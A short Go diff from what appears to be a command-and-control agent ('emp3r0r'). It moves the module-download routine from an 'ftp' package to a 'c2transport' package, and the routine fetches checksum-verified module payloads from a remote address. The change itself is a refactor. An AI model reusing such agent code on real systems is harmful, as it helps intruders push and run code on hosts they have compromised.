@@ -12,8 +12,8 @@ import (
 
 	"github.com/jm33-m0/arc"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/agentutils"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/ftp"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
@@ -169,7 +169,7 @@ func prepareModuleOnDisk(tarball, modDir string, payload_data []byte) error {
 
 func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (data []byte, err error) {
 	if crypto.SHA256SumFile(file_to_download) != checksum {
-		if data, err = ftp.SmartDownload(download_addr, file_to_download, "", checksum); err != nil {
+		if data, err = c2transport.SmartDownload(download_addr, file_to_download, "", checksum); err != nil {
 			return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
 		}
 	}
